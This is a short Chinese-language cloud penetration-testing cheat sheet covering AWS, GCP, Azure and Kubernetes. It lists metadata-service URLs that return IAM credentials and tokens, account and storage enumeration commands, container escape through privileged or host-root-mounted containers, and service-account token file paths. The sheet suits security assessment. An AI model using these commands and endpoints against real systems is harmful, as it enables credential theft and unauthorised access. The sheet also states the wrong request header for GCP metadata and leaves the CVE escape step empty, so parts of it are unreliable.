# 云安全漏洞补充

## 1. AWS攻击

### 元数据服务

```
# 基础信息
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# IAM凭证
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 实例信息
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/public-hostname
```

### S3存储桶

```bash
# 枚举
aws s3 ls s3://bucket-name/
aws s3api list-buckets

# 公开访问
aws s3 cp file.txt s3://bucket-name/

# 权限
aws s3api get-bucket-policy --bucket bucket-name
```

### IAM枚举

```bash
aws iam list-users
aws iam list-roles
aws iam list-policies
```

---

## 2. GCP攻击

### 元数据服务

```
# 需要Header: Metadata: true
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### 权限枚举

```bash
gcloud projects list
gcloud compute instances list
gsutil ls
```

---

## 3. Azure攻击

### 元数据服务

```
# 需要Header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute
http://169.254.169.254/metadata/identity/oauth2/token
```

### 枚举

```bash
az account list
az vm list
az storage account list
```

---

## 4. Kubernetes攻击

### Pod逃逸

```bash
# 特权容器
docker run --privileged

# 挂载宿主机
docker run -v /:/host

# 利用CVE
```

### 服务账户令牌

```
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
```

---

## 5. 云安全工具

```bash
# ScoutSuite
python3 scoutsuite.py --provider aws

# Prowler
./prowler

# Cloudsploit
python3 cloudsploit
```
